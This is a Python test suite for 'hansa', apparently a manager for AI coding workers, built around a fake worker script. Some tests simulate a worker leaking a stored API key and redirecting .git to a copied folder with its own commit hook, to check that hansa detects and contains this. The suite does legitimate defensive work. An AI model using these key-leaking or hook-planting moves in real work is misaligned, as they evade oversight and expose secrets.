"""Tests for hansa with a stand-in for claude, so no model is called."""
import contextlib
import io
import json
import os
import re
import shlex
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import unittest.mock
import urllib.error
import urllib.request
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hansa import account, cost, views  # noqa: E402
from hansa.cli import init_desk, main  # noqa: E402
from hansa.desk import Desk, public_settings, validate  # noqa: E402
from hansa.run import Dispatcher, join_command, provider_problem, tmux_bin, tmux_socket, waiting_reason  # noqa: E402
from hansa.web import start_web  # noqa: E402

FAKE = r'''#!/usr/bin/env python3
import json, os, subprocess, sys, time
prompt = sys.stdin.read() if "-p" in sys.argv else sys.argv[1]
if "-p" not in sys.argv:  # a design session, in a terminal the principal joins
    if os.environ.get("FAKE_SHOW_ARGV"):
        open(os.environ["FAKE_SHOW_ARGV"], "a").write(json.dumps(sys.argv) + "\n")
    sid = sys.argv[sys.argv.index("--session-id") + 1]
    rec = os.path.join(os.environ["CLAUDE_CONFIG_DIR"], "projects", "-design", sid + ".jsonl")
    os.makedirs(os.path.dirname(rec), exist_ok=True)
    open("badge.txt", "w").write("bigger\n")
    with open(rec, "w") as f:
        for i, t in enumerate(("Here is how it looks now.", "Hand-in: the badge is bigger; the checks pass.")):
            f.write(json.dumps({"type": "assistant", "message": {"id": f"d{i}", "model": "claude-x", "content": [
                {"type": "text", "text": t}], "usage": {"input_tokens": 100, "output_tokens": 20}}}) + "\n")
    time.sleep(float(os.environ.get("FAKE_DESIGN_SECONDS", "0")))
    sys.exit(0)
compat = bool(os.environ.get("ANTHROPIC_BASE_URL"))
if compat and os.environ.get("FAKE_BADKEY_ON_COMPAT"):
    print(json.dumps({"type": "result", "subtype": "success", "is_error": True, "api_error_status": 401,
                      "result": "API Error: 401 authentication_error", "session_id": "s-key", "num_turns": 1}))
    sys.exit(1)
if compat and os.environ.get("FAKE_NOLOGIN_ON_COMPAT"):
    print(json.dumps({"type": "result", "subtype": "success", "is_error": True, "api_error_status": None,
                      "terminal_reason": "api_error", "num_turns": 1,
                      "result": "Not logged in · Please run /login"}))
    sys.exit(1)
if compat and os.environ.get("FAKE_QUOTA_ON_COMPAT"):
    print(json.dumps({"type": "result", "subtype": "success", "is_error": True, "api_error_status": 429,
                      "result": "API Error: 429 rate_limit_error", "session_id": "s-quota", "num_turns": 1}))
    sys.exit(1)
if compat and os.environ.get("FAKE_REFUSE_ON_COMPAT"):
    print(json.dumps({"type": "result", "subtype": "success", "is_error": False, "stop_reason": "content_filter",
                      "result": "The request was rejected because it was considered high risk", "num_turns": 1}))
    sys.exit(0)
if os.environ.get("FAKE_TRANSCRIPT"):  # "late": a background notice opens a turn after the report
    sid = sys.argv[sys.argv.index("--session-id") + 1]
    rec = os.path.join(os.environ["CLAUDE_CONFIG_DIR"], "projects", "-work", sid + ".jsonl")
    os.makedirs(os.path.dirname(rec), exist_ok=True)
    notice = lambda n: {"type": "user", "turnOrigin": "task_notification", "promptSource": "system", "message": {
        "role": "user", "content": "<task-notification> <task-id>" + n + "</task-id> timed out"}}
    say = lambda mid, t: {"type": "assistant", "message": {"id": mid, "model": "mimo-x", "content": [
        {"type": "text", "text": t}]}}
    report = "Report: fixed the badge; the tests pass." + (" Key: " + os.environ["FAKE_WRITE"] if os.environ.get("FAKE_WRITE") else "")
    rows = [{"type": "user", "turnOrigin": "sdk", "promptSource": "sdk", "message": {"role": "user", "content": prompt}},
            say("a1", "Starting a watch."),
            {"type": "assistant", "message": {"id": "a1", "content": [{"type": "tool_use", "id": "u1", "name": "Bash"}]}},
            {"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "u1"}]}},
            notice("early"), say("a2", "The watch said the tests pass."), say("a3", report)]
    late = os.environ["FAKE_TRANSCRIPT"] == "late"
    if late:
        rows += [notice("baxumxafe"), say("a4", "That notice is the watch. My report above is still my final report.")]
    with open(rec, "w") as f:
        f.writelines(json.dumps(r) + "\n" for r in rows)
    print(json.dumps({"type": "result", "subtype": "success", "is_error": False, "num_turns": 5, "session_id": sid,
                      "result": rows[-1]["message"]["content"][0]["text"]}))
    sys.exit(0)
if os.environ.get("FAKE_STOP_AT_TURNS"):
    sid = sys.argv[sys.argv.index("--session-id") + 1]
    rec = os.path.join(os.environ["CLAUDE_CONFIG_DIR"], "projects", "-work", sid + ".jsonl")
    os.makedirs(os.path.dirname(rec), exist_ok=True)
    with open(rec, "w") as f:
        for t in ("Opening the list page.", "Found: the week badge is still in English."):
            f.write(json.dumps({"type": "assistant", "message": {"id": t, "model": "mimo-x", "content": [
                {"type": "text", "text": t}], "usage": {"input_tokens": 700, "cache_read_input_tokens": 3000}}}) + "\n")
    print(json.dumps({"type": "result", "subtype": "error_max_turns", "is_error": True, "num_turns": 9,
                      "session_id": sid}))
    sys.exit(1)
if os.environ.get("FAKE_NO_CHANGES"):
    print(json.dumps({"type": "result", "subtype": "success", "is_error": False, "result": "Nothing to do.",
                      "num_turns": 1}))
    sys.exit(0)
if "single word OK" in prompt:
    print(json.dumps({"type": "result", "subtype": "success", "is_error": False, "result": "OK",
                      "modelUsage": {"fake-model": {"inputTokens": 1, "outputTokens": 1}}}))
    sys.exit(0)
if os.environ.get("FAKE_SAY_KEY"):  # an endpoint's error that repeats the key
    print("endpoint said: bad token " + os.environ.get("ANTHROPIC_AUTH_TOKEN", ""), file=sys.stderr, flush=True)
    time.sleep(float(os.environ["FAKE_SAY_KEY"]))
hello = os.environ.get("FAKE_HELLO", "hello.txt")
if os.environ.get("FAKE_SEE") and os.path.exists(hello):  # what the file held when the worker started
    open(os.environ["FAKE_SEE"], "w").write(open(hello).read())
open(hello, "w").write("hello from " + os.environ.get("HANSA_TASK", "?") + "\n")
if os.environ.get("FAKE_WRITE_BINARY"):
    open("blob.bin", "wb").write(b"\x00\x01PK" + os.environ["FAKE_WRITE_BINARY"].encode() + b"\x00\xff")
if os.environ.get("FAKE_LEAVE_CHILD"):  # something it started and left running, in its process group
    c = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    open(os.environ["FAKE_LEAVE_CHILD"], "w").write(str(c.pid))
if os.environ.get("FAKE_WRITE"):
    open("notes.txt", "w").write(os.environ["FAKE_WRITE"] + "\n")
if os.environ.get("FAKE_REDIRECT_GIT"):  # points .git at a copy of the git folder with a hook of its own
    import shutil
    common = subprocess.run(["git", "rev-parse", "--git-common-dir"], capture_output=True, text=True).stdout.strip()
    shutil.copytree(common, "copied-git", symlinks=True)
    hook = os.path.join("copied-git", "hooks", "post-commit")
    open(hook, "w").write("#!/bin/sh\ntouch " + os.environ["FAKE_REDIRECT_GIT"] + "\n")
    os.chmod(hook, 0o755)
    open(".git", "w").write("gitdir: " + os.path.abspath("copied-git") + "\n")
if os.environ.get("FAKE_SHOW_ARGV"):
    open(os.environ["FAKE_SHOW_ARGV"], "a").write(json.dumps(sys.argv) + "\n")
print(json.dumps({"type": "result", "subtype": "success", "is_error": False, "num_turns": 3,
    "result": "Added hello.txt. Checked it exists." + (" Notes: " + os.environ["FAKE_WRITE"] if os.environ.get("FAKE_WRITE") else "") + ("\nran:\n" * 70 + "VERDICT: " + os.environ["FAKE_VERDICT"]
                                                      if os.environ.get("FAKE_VERDICT") else ""),
    "session_id": "s-ok",
    "permission_denials": [{"tool_name": "Bash", "tool_input": {"command": "env JAVA_HOME=/x mvn test"}}],
    "modelUsage": {"claude-haiku-4-5-20251001": {"inputTokens": 1000, "outputTokens": 200,
        "cacheReadInputTokens": 5000, "cacheCreationInputTokens": 100, "costUSD": 0.0031, "costBasis": "list"}}}))
'''


# A stand-in for srt: records how it was called, with the settings file's content, then runs the command.
# Like the real one, it ignores the TMPDIR it is given: inside, TMPDIR is CLAUDE_CODE_TMPDIR, else /tmp/claude.
FAKE_SRT = r'''#!/usr/bin/env python3
import json, os, stat, sys
os.environ["TMPDIR"] = os.environ.get("CLAUDE_CODE_TMPDIR") or "/tmp/claude"
args = sys.argv[1:]
cut = args.index("--")
settings = json.load(open(args[args.index("--settings") + 1]))
mode = os.fstat(1).st_mode
with open(LOG, "a") as f:
    f.write(json.dumps({"argv": args, "settings": settings, "tmpdir": os.environ.get("TMPDIR", ""),
                        "tmp_there": os.path.isdir(os.environ.get("TMPDIR", "")), "cwd": os.getcwd(),
                        "stdout": "pipe" if stat.S_ISFIFO(mode) else "file" if stat.S_ISREG(mode) else "other"}) + "\n")
os.execvp(args[cut + 1], args[cut + 1:])
'''


def sh(*args, cwd):
    subprocess.run(args, cwd=cwd, check=True, capture_output=True)


class DeskTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        sh("git", "init", "-q", "-b", "main", cwd=self.repo)
        (self.repo / "README.md").write_text("demo\n")
        sh("git", "add", ".", cwd=self.repo)
        sh("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init", cwd=self.repo)
        fake = self.tmp / "claude"
        fake.write_text(FAKE)
        fake.chmod(0o755)
        os.environ["HANSA_CLAUDE"] = str(fake)
        self.srt_log = self.tmp / "srt-calls.jsonl"
        (self.tmp / "bin").mkdir()
        srt = self.tmp / "bin" / "srt"
        srt.write_text(FAKE_SRT.replace("open(LOG", f"open({str(self.srt_log)!r}"))
        srt.chmod(0o755)
        path = unittest.mock.patch.dict(os.environ, {"PATH": f"{self.tmp / 'bin'}{os.pathsep}{os.environ['PATH']}"})
        path.start()
        self.addCleanup(path.stop)
        self.desk = init_desk(self.tmp / "desk", str(self.repo), "a")

    def srt_calls(self) -> list:
        return [json.loads(x) for x in self.srt_log.read_text().splitlines()] if self.srt_log.exists() else []

    def without_srt(self):
        """PATH without the stand-in srt, or any other."""
        keep = [d for d in os.environ["PATH"].split(os.pathsep) if d and not (Path(d) / "srt").exists()]
        return unittest.mock.patch.dict(os.environ, {"PATH": os.pathsep.join(keep)})

    def settle(self, d, tid, timeout=20):
        end = time.time() + timeout
        while time.time() < end:
            d.tick()
            if self.desk.meta(tid)["state"] not in ("queued", "running"):
                return self.desk.meta(tid)
            time.sleep(0.1)
        self.fail(f"{tid} did not finish: {self.desk.meta(tid)}")

    def test_task_runs_is_recorded_and_merges(self):
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "done", m)
        self.assertEqual(m["files"], ["hello.txt"])
        self.assertGreaterEqual(m["commits"], 1)  # left uncommitted by the worker, committed by hansa
        self.assertEqual(m["denials"], ["Bash: env JAVA_HOME=/x mvn test"])
        self.assertIn("hello.txt", views.show_text(self.desk, tid))
        self.assertEqual(main(["--desk", str(self.desk.root), "merge", tid]), 0)
        self.assertEqual(self.desk.meta(tid)["state"], "merged")
        self.assertTrue((self.repo / "hello.txt").exists())

    def test_hansa_commits_for_the_worker_and_keeps_git_rules_from_it(self):
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["lanes"]["a"]["allow"] = ["Bash(git commit:*)", "Bash(pnpm test:*)"]  # saved before hansa took over git
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen)}
        self.desk.settings_path.write_text(json.dumps(s))
        self.assertTrue(any("git is handled by hansa" in p for p in validate(s)))  # the page refuses new ones
        tid = self.desk.new_task("Add hello.txt", title="Add a greeting")
        m = self.settle(Dispatcher(self.desk), tid)
        argv = json.loads(seen.read_text().splitlines()[-1])
        self.assertNotIn("Bash(git commit:*)", argv[argv.index("--allowedTools"):])
        self.assertIn("Bash(pnpm test:*)", argv)
        self.assertIn("hansa commits", argv[argv.index("--append-system-prompt") + 1])
        msg = subprocess.run(["git", "log", "-1", "--format=%s", m["head"]], cwd=self.repo,
                             capture_output=True, text=True).stdout.strip()
        self.assertEqual(msg, f"{tid}: Add a greeting")
        self.assertIn("ignored", views.explain_text(self.desk, "lane", "a"))

    def test_a_change_holding_a_stored_key_is_never_merged_and_the_key_is_never_shown(self):
        key = "sk-test-0123456789"
        self.desk.write_key("mimo", key)
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_WRITE": key}
        s["lanes"]["a"]["check"] = "cat notes.txt"  # a check that prints what the change holds
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["leaked"]), ("done", ["mimo"]), m)
        shown = views.show_text(self.desk, tid)
        self.assertIn("key of mimo", shown)
        self.assertNotIn(key, shown)
        self.assertNotIn(key, views.diff_text(self.desk, tid))
        self.assertIn("key of mimo", views.diff_text(self.desk, tid))
        self.assertNotIn(key, json.dumps(m["check"]))
        self.assertNotIn(key, (self.desk.tasks_dir / tid / "check.log").read_text())
        self.assertNotIn(key, (self.desk.tasks_dir / tid / "result.md").read_text())
        self.assertNotIn(key, self.desk.events_path.read_text())
        self.assertIn("key", views.status_text(views.status(self.desk)))
        with self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "merge", tid, "--despite-check"])
        self.assertFalse((self.repo / "notes.txt").exists())
        self.desk.event("anything", detail=f"the endpoint said: bad key {key}")
        self.assertNotIn(key, self.desk.events_path.read_text())

    def test_a_key_too_short_to_look_for_is_refused(self):
        with self.assertRaises(ValueError):
            self.desk.write_key("mimo", "sk-1234")
        self.assertFalse(self.desk.has_key("mimo"))

    def test_a_key_inside_a_binary_file_is_found_too(self):
        key = "sk-test-binary-0456"
        self.desk.write_key("mimo", key)
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_WRITE_BINARY": key}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["leaked"]), ("done", ["mimo"]), m)

    def test_merge_looks_for_keys_again_when_it_merges(self):
        later = "sk-saved-later-0789"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_WRITE": later}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["leaked"]), ("done", []), m)
        self.desk.write_key("mimo", later)  # that text became a key after the task ended
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "merge", tid])
        self.assertFalse((self.repo / "notes.txt").exists())

    def test_what_a_worker_prints_stays_out_of_the_task_folder_until_hansa_removes_keys(self):
        key = "sk-test-printed-0321"
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo"]
        s["lanes"]["a"]["env"] = {"FAKE_SAY_KEY": "2"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", key)
        tid = self.desk.new_task("Add hello.txt")
        d = Dispatcher(self.desk)
        d.tick()
        raw = self.desk.state_dir / "runs" / tid / "run.err"
        end = time.time() + 10
        while key not in (raw.read_text() if raw.exists() else "") and time.time() < end:
            time.sleep(0.1)
        self.assertIn(key, raw.read_text())  # raw output goes where no agent may read
        folder = self.desk.tasks_dir / tid
        self.assertFalse([f.name for f in folder.iterdir() if f.is_file() and key in f.read_text(errors="replace")])
        self.settle(d, tid)
        self.assertIn("key of mimo", (folder / "run.err").read_text())
        self.assertFalse([f.name for f in folder.iterdir() if f.is_file() and key in f.read_text(errors="replace")])
        self.assertFalse(raw.exists())  # no raw copy is kept once it is published

    def test_what_a_failing_setup_leaves_is_not_part_of_the_task(self):
        s = self.desk.settings()
        s["lanes"]["a"]["setup"] = "echo partial > config.txt; exit 1"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["commits"], m["files"]), ("failed", 0, []), m)

    def test_a_worker_started_just_before_the_server_stopped_is_taken_over(self):
        token = f"hansa-launch-test-{uuid.uuid4().hex[:8]}"  # another suite running meanwhile has its own
        orphan = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", token], start_new_session=True)
        self.addCleanup(lambda: orphan.poll() is None and orphan.kill())
        tid = self.desk.new_task("Add hello.txt")
        self.desk.update(tid, state="running", phase="starting", lane="a", provider="claude", started=time.time(),
                         pid=None, launch=token)
        Dispatcher(self.desk).tick()
        m = self.desk.meta(tid)
        self.assertEqual((m["state"], m["phase"], m["pid"]), ("running", "", orphan.pid), m)
        self.assertIsNone(orphan.poll())  # still working, not stopped and started over

    def test_a_check_an_earlier_server_finished_is_not_run_again(self):
        marker = self.tmp / "checked"
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = f"touch {marker}"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.desk.update(tid, state="running", phase="checking", lane="a", provider="claude", started=time.time(),
                         pid=None, launch="hansa-check-t0001-gone", worktree=str(self.repo), check_command=f"touch {marker}")
        raw = self.desk.raw_dir(tid)
        (raw / "check.exit").write_text("0\n")
        (raw / "check.log").write_text("all passed\n")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["check"]["ok"], m["check"]["tail"]), ("done", True, ["all passed"]), m)
        self.assertFalse(marker.exists())

    def test_a_key_saved_later_is_removed_from_what_was_already_published(self):
        later = "sk-saved-later-0654"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_WRITE": later}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.settle(Dispatcher(self.desk), tid)
        report = self.desk.tasks_dir / tid / "result.md"
        self.assertIn(later, report.read_text())  # not a key yet
        self.desk.write_key("mimo", later)
        self.assertNotIn(later, report.read_text())
        self.assertIn("[key of mimo]", report.read_text())
        self.assertNotIn(later, views.show_text(self.desk, tid))

    def test_a_key_that_only_a_merge_commit_brings_is_found(self):
        from hansa.run import keys_in_change
        key = "sk-test-in-merge-0987"
        self.desk.write_key("mimo", key)
        g = lambda *a: subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=self.repo,
                                      check=True, capture_output=True, text=True).stdout.strip()
        base = g("rev-parse", "HEAD")
        g("checkout", "-q", "-b", "side")
        (self.repo / "side.txt").write_text("side\n")
        g("add", ".")
        g("commit", "-q", "-m", "side")
        g("checkout", "-q", "main")
        g("merge", "--no-ff", "--no-commit", "side")
        (self.repo / "side.txt").write_text(key + "\n")  # changed in the merge itself
        g("add", ".")
        g("commit", "-q", "-m", "merge side")  # no other commit shows that line
        self.assertEqual(keys_in_change(self.desk, self.repo, base, g("rev-parse", "HEAD")), ["mimo"])

    def test_a_task_cancelled_before_its_check_starts_is_not_checked(self):
        marker = self.tmp / "checked"
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = f"touch {marker}"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.desk.update(tid, state="running", phase="checking", lane="a", provider="claude", started=time.time(),
                         pid=None, cancel=True, worktree=str(self.repo))
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "cancelled", m)
        started = [e for e in map(json.loads, self.desk.events_path.read_text().splitlines())
                   if e["event"] == "check_started" and e.get("task") == tid]
        self.assertEqual(started, [])  # not started and then stopped: never started
        self.assertFalse(marker.exists())

    def test_what_a_worker_leaves_running_ends_with_it(self):
        from hansa.run import alive
        pidfile = self.tmp / "child.pid"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_LEAVE_CHILD": str(pidfile)}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.assertEqual(self.settle(Dispatcher(self.desk), tid)["state"], "done")
        child = int(pidfile.read_text())
        self.addCleanup(lambda: alive(child) and os.kill(child, 9))
        end = time.time() + 10
        while alive(child) and time.time() < end:
            time.sleep(0.1)
        self.assertFalse(alive(child))

    def test_git_behind_a_wrapper_is_still_git(self):
        from hansa.run import lane_allow
        s = self.desk.settings()
        s["lanes"]["a"]["allow"] = ["Bash(env git commit:*)", "Bash(GIT_DIR=x git log:*)", "Bash(command git push:*)",
                                    "Bash(/usr/bin/git show:*)", "Bash(sudo -u deploy git log:*)",
                                    'Bash(bash -c "git commit -am x":*)', "Bash(pnpm test:*)", "Bash(gitleaks detect:*)"]
        self.assertEqual(sum("git is handled by hansa" in p for p in validate(s)), 1)
        self.assertEqual([r for r in lane_allow(self.desk, s["lanes"]["a"], self.repo) if r.startswith("Bash")],
                         ["Bash(pnpm test:*)", "Bash(gitleaks detect:*)"])

    def test_a_merge_hook_that_uses_hansa_does_not_hang_the_merge(self):
        tid = self.desk.new_task("Add hello.txt")
        self.assertEqual(self.settle(Dispatcher(self.desk), tid)["state"], "done")
        hansa = str(Path(__file__).resolve().parent.parent / "bin" / "hansa")
        hook = self.repo / ".git" / "hooks" / "post-merge"
        hook.write_text(f'#!/bin/sh\n"{hansa}" --desk "{self.desk.root}" add "queued by a hook" >/dev/null\n')
        hook.chmod(0o755)
        r = subprocess.run([hansa, "--desk", str(self.desk.root), "merge", tid], capture_output=True, text=True, timeout=15)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.desk.meta(tid)["state"], "merged")
        self.assertEqual(len(self.desk.tasks()), 1)  # the hook's hansa add was refused at once, not left waiting
        r = subprocess.run([hansa, "--desk", str(self.desk.root), "add", "x"], capture_output=True, text=True, timeout=15,
                           env={**os.environ, "HANSA_MERGING": "1"})
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("hook of a hansa merge", r.stderr)

    def git_out(self, *args, cwd=None) -> str:
        return subprocess.run(["git", *args], cwd=cwd or self.repo, check=True, capture_output=True,
                              text=True).stdout.strip()

    def two_lanes(self, check=""):
        """Lanes a and b on the one repository, each worker writing a file of its own (a.txt, b.txt), and one
        finished task on each, both made from the same base."""
        s = self.desk.settings()
        s["lanes"]["b"] = json.loads(json.dumps(s["lanes"]["a"]))
        s["lanes"]["a"].update(env={"FAKE_HELLO": "a.txt"}, check=check)
        s["lanes"]["b"].update(env={"FAKE_HELLO": "b.txt"}, check=check)
        self.assertEqual(self.desk.save_settings(s), [])
        d = Dispatcher(self.desk)
        t1, t2 = self.desk.new_task("Add a.txt", lane="a"), self.desk.new_task("Add b.txt", lane="b")
        for t in (t1, t2):
            m = self.settle(d, t)
            self.assertEqual((m["state"], (m.get("check") or {"ok": True})["ok"]), ("done", True), m)
        return d, t1, t2

    def settle_merge(self, d, tid, timeout=20):
        end = time.time() + timeout
        while time.time() < end:
            d.tick()
            if self.desk.meta(tid)["state"] != "merging":
                return self.desk.meta(tid)
            time.sleep(0.1)
        self.fail(f"{tid}'s merge check did not end: {self.desk.meta(tid)}")

    def test_two_changes_that_fail_the_check_together_are_not_merged(self):
        d, t1, t2 = self.two_lanes(check="if test -f a.txt && test -f b.txt; then echo a and b clash; exit 1; fi")
        self.assertIn(f"{t1} merged into main", self.hansa("merge", t1))  # the base had not moved: at once
        tip = self.git_out("rev-parse", "main")
        out = self.hansa("merge", t2)
        self.assertIn(f"{t2} is not merged yet: main has 2 commit(s) that {t2}'s branch does not", out)
        self.assertIn(f"hansa wait {t2}", out)
        self.assertEqual(self.desk.meta(t2)["state"], "merging")
        self.assertIn("merge check queued", views.show_text(self.desk, t2))
        self.assertIn(f"{t2} b: Add b.txt\n      merge check queued", views.status_text(views.status(self.desk)))
        m = self.settle_merge(d, t2)
        self.assertEqual((m["state"], m["merge_check_result"]["ok"], m["merge_check_result"]["exit"]), ("done", False, 1))
        self.assertEqual(self.git_out("rev-parse", "main"), tip)  # nothing was merged
        self.assertFalse((self.repo / "b.txt").exists())
        self.assertEqual(Path(self.srt_calls()[-1]["cwd"]).resolve(), (self.desk.worktrees_dir / "b").resolve())
        shown = views.show_text(self.desk, t2)
        self.assertIn(f"ran the lane's check there): FAILED (exit 1)", shown)
        self.assertIn("a and b clash", shown)
        self.assertIn(f"hansa retry {t2} --update", shown)
        self.assertIn("merge check FAILED", views.status_text(views.status(self.desk)))

    def test_two_changes_that_pass_together_merge_after_their_merge_check(self):
        d, t1, t2 = self.two_lanes(check="test -f README.md")
        self.hansa("merge", t1)
        tip = self.git_out("rev-parse", "main")
        self.hansa("merge", t2)
        d.tick()
        self.assertIn("merge check running", views.show_text(self.desk, t2))
        m = self.settle_merge(d, t2)
        self.assertEqual((m["state"], m["merge_check_result"]["ok"]), ("merged", True), m)
        main = self.git_out("rev-parse", "main")
        self.assertEqual(main, m["merge_commit"])
        self.assertEqual(main, m["merge_check_result"]["commit"])  # exactly the commit that was checked
        self.assertEqual(self.git_out("rev-list", "--parents", "-n", "1", main).split()[1:], [tip, m["head"]])
        self.assertTrue((self.repo / "b.txt").exists())
        self.assertEqual(self.git_out("status", "--porcelain"), "")

    def test_a_merge_checks_setup_and_check_write_into_a_pipe_and_their_output_is_kept(self):
        d, t1, t2 = self.two_lanes()
        s = self.desk.settings()
        s["lanes"]["b"].update(setup="echo set up for the merge", check="echo merged badly; exit 3")
        self.assertEqual(self.desk.save_settings(s), [])
        self.hansa("merge", t1)
        calls = len(self.srt_calls())
        self.hansa("merge", t2)
        m = self.settle_merge(d, t2)
        self.assertEqual((m["state"], m["merge_check_result"]["exit"]), ("done", 3), m)
        setup, check = self.srt_calls()[calls:]
        self.assertEqual((setup["argv"][-1], check["argv"][-1]), ("echo set up for the merge", "echo merged badly; exit 3"))
        self.assertEqual((setup["stdout"], check["stdout"]), ("pipe", "pipe"))
        self.assertIn("set up for the merge", (self.desk.tasks_dir / t2 / "merge-setup.log").read_text())
        self.assertIn("merged badly", (self.desk.tasks_dir / t2 / "merge-check.log").read_text())

    def test_a_merge_check_whose_base_keeps_moving_is_checked_once_more_then_stops(self):
        d, t1, t2 = self.two_lanes()
        s = self.desk.settings()  # a check that moves the base each time it runs
        s["lanes"]["b"]["check"] = f"git -C {self.repo} -c user.name=t -c user.email=t@t commit -q --allow-empty -m moved"
        self.assertEqual(self.desk.save_settings(s), [])
        self.hansa("merge", t1)
        self.hansa("merge", t2)
        m = self.settle_merge(d, t2)
        self.assertEqual((m["state"], m["merge_check_result"]["ok"]), ("done", False), m)
        self.assertIn("moved each time before hansa could merge it; nothing was merged", m["merge_check_result"]["note"])
        self.assertEqual([e["moves"] for e in self.events("merge_check_base_moved")], [1, 2])
        self.assertFalse((self.repo / "b.txt").exists())

    def test_a_task_whose_base_did_not_move_merges_at_once(self):
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = "test -f hello.txt"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        self.settle(Dispatcher(self.desk), tid)
        calls = len(self.srt_calls())
        self.assertIn(f"{tid} merged into main", self.hansa("merge", tid))
        self.assertEqual(self.desk.meta(tid)["state"], "merged")
        self.assertEqual(len(self.srt_calls()), calls)  # no check ran for the merge

    def test_a_lane_without_a_check_merges_at_once_and_says_its_tasks_go_untested(self):
        out = self.hansa("lane", "add", "b", "--repo", str(self.repo))
        self.assertIn("Lane b has no check, so its tasks will be merged untested", out)
        self.assertIn('hansa lane set b check "', out)
        self.hansa("lane", "set", "a", "env", "FAKE_HELLO=a.txt")
        self.hansa("lane", "set", "b", "env", "FAKE_HELLO=b.txt")
        d = Dispatcher(self.desk)
        t1, t2 = self.desk.new_task("Add a.txt", lane="a"), self.desk.new_task("Add b.txt", lane="b")
        for t in (t1, t2):
            self.settle(d, t)
        self.assertIn("Lane b has no check, so this task will be merged untested", views.show_text(self.desk, t2))
        self.hansa("merge", t1)
        self.assertIn(f"{t2} merged into main", self.hansa("merge", t2))  # the base moved, but there is no check
        self.assertEqual((self.desk.meta(t2)["state"], (self.repo / "b.txt").exists()), ("merged", True))

    def test_lane_add_sets_the_check_setup_and_allowed_commands(self):
        out = self.hansa("lane", "add", "c", "--repo", str(self.repo), "--check", "make test", "--setup", "make deps",
                         "--allow", "Bash(make test:*)", "Bash(make lint:*)")
        c = self.desk.settings()["lanes"]["c"]
        self.assertEqual((c["check"], c["setup"], c["allow"]),
                         ("make test", "make deps", ["Bash(make test:*)", "Bash(make lint:*)"]))
        self.assertNotIn("untested", out)
        self.assertIn("Tell the principal", out)
        self.assertEqual(sorted(e["field"] for e in self.events("lane_command_changed")), ["check", "setup"])

    def test_lane_try_runs_the_setup_and_check_once_and_leaves_the_worktree_clean(self):
        from hansa import run
        self.hansa("lane", "set", "a", "setup", "echo set up for the try; echo left > left.txt")
        out = self.hansa("lane", "set", "a", "check", "echo checked badly; exit 3")
        self.assertTrue(out.rstrip().endswith("hansa lane try a"), out)
        d, stop_serving = Dispatcher(self.desk), threading.Event()

        def serve():  # hansa serve, which runs the try
            while not stop_serving.is_set():
                d.tick()
                time.sleep(0.05)
        d.tick()
        server = threading.Thread(target=serve)
        server.start()
        said = io.StringIO()
        try:
            with contextlib.redirect_stdout(said), self.assertRaises(SystemExit) as e:
                main(["--desk", str(self.desk.root), "lane", "try", "a", "--every", "0.05"])
        finally:
            stop_serving.set()
            server.join()
        said = said.getvalue()
        self.assertEqual(e.exception.code, 1)
        self.assertIn("set up for the try", said)
        self.assertIn("checked badly", said)
        self.assertIn("exit 3", said)
        self.assertIn("exit 0", said)  # the setup's
        setup, check = self.srt_calls()
        self.assertEqual((setup["argv"][-1], check["argv"][-1]),
                         ("echo set up for the try; echo left > left.txt", "echo checked badly; exit 3"))
        wt = self.desk.worktrees_dir / "a"
        self.assertEqual(Path(check["cwd"]).resolve(), wt.resolve())
        self.assertEqual(self.git_out("status", "--porcelain", "--ignored", cwd=wt), "")
